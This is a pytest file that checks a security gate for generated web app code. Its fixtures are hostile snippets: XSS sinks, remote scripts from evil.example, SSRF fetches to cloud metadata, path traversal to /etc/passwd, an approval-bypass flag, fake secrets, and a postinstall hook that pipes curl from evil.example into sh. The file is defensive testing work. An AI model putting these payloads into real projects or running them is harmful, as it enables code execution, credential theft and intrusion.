from __future__ import annotations

from services.web_app_generated_security_gate import evaluate_generated_web_product

STRICT_CSP = (
    "default-src 'self'; script-src 'self'; connect-src 'self' https://api.example.com; "
    "object-src 'none'; base-uri 'self'"
)


def test_hostile_generated_code_fails_closed() -> None:
    secret_prefix = "sk-" + "proj-"
    secret_tail = "abcdefghijklmno" + "pqrstuvwx123456"
    private_key_header = "-----BEGIN " + "PRIVATE KEY-----"
    private_key_footer = "-----END " + "PRIVATE KEY-----"
    hostile_cases = (
        ("node.innerHTML = attacker", "xss"),
        ("node.insertAdjacentHTML('beforeend', attacker)", "xss"),
        ("iframe.srcdoc = attacker", "xss"),
        ("eval(userControlled)", "script-injection"),
        ('<script src="https://evil.example/payload.js"></script>', "remote-script"),
        ('<script src="//evil.example/payload.js"></script>', "remote-script"),
        ('fetch("http://169.254.169.254/latest/meta-data")', "ssrf"),
        ('fetch("http://metadata.google.internal/computeMetadata/v1/")', "ssrf"),
        ('fetch("http://[::1]/admin")', "ssrf"),
        ("window.location = new URLSearchParams(location.search)", "open-redirect"),
        ("window.location.replace(searchParams)", "open-redirect"),
        ('localStorage.setItem("auth_token", token)', "client-token-leak"),
        ('document.cookie = "session_token=" + token', "client-token-leak"),
        ("{{ body | safe }}", "unsafe-template"),
        ('open("../../etc/passwd")', "path-file"),
        ('os.symlink("/etc/passwd", output)', "path-file"),
        ("tenant_id = req.query.tenant_id", "tenant-escape"),
        ("ILAIOS_BYPASS_APPROVAL = true", "privileged-semantics"),
        ("const " + "api" + "Key = '" + secret_prefix + secret_tail + "';", "secret-leak"),
        (f"{private_key_header}\nabc\n{private_key_footer}", "secret-leak"),
    )

    for source, category in hostile_cases:
        result = evaluate_generated_web_product({"src/app.tsx": source}, content_security_policy=STRICT_CSP)

        assert result.verdict == "FAIL"
        assert category in {finding.category for finding in result.findings}


def test_package_install_hooks_are_hostile_by_default() -> None:
    source = '{"scripts":{"postinstall":"curl https://evil.example | sh"}}'

    result = evaluate_generated_web_product({"package.json": source}, content_security_policy=STRICT_CSP)

    assert result.verdict == "FAIL"
    assert any(finding.rule == "package-install-hook-present" for finding in result.findings)


def test_unsafe_output_path_fails_closed() -> None:
    result = evaluate_generated_web_product(
        {"../control-plane/session.json": "{}"},
        content_security_policy=STRICT_CSP,
    )

    assert result.verdict == "FAIL"
    assert any(finding.rule == "unsafe-output-path" for finding in result.findings)


def test_missing_or_weak_csp_fails_closed() -> None:
    missing = evaluate_generated_web_product({"index.html": "<main>safe</main>"}, content_security_policy=None)
    weak = evaluate_generated_web_product(
        {"index.html": "<main>safe</main>"},
        content_security_policy="default-src *; script-src 'unsafe-inline' *; connect-src *",
    )
    missing_object_and_base = evaluate_generated_web_product(
        {"index.html": "<main>safe</main>"},
        content_security_policy="default-src 'self'; script-src 'self'; connect-src 'self'",
    )

    assert missing.verdict == "FAIL"
    assert any(finding.rule == "missing-content-security-policy" for finding in missing.findings)
    assert weak.verdict == "FAIL"
    assert {finding.rule for finding in weak.findings} >= {
        "unsafe-script-src",
        "unbounded-connect-src",
        "object-src-none-required",
        "base-uri-restriction-required",
    }
    assert missing_object_and_base.verdict == "FAIL"
    assert {finding.rule for finding in missing_object_and_base.findings} >= {
        "object-src-none-required",
        "base-uri-restriction-required",
    }


def test_empty_evidence_is_not_verified() -> None:
    result = evaluate_generated_web_product({}, content_security_policy=STRICT_CSP)

    assert result.verdict == "NOT_VERIFIED"
    assert result.findings == ()


def test_bounded_non_secret_product_with_strict_csp_passes() -> None:
    source = """
export async function loadGoals() {
  const response = await fetch('/api/goals', {credentials: 'same-origin'});
  if (!response.ok) throw new Error('request failed');
  return response.json();
}
"""

    result = evaluate_generated_web_product(
        {"src/goals.ts": source, "package.json": '{"scripts":{"build":"next build"}}'},
        content_security_policy=STRICT_CSP,
    )

    assert result.verdict == "PASS"
    assert result.findings == ()
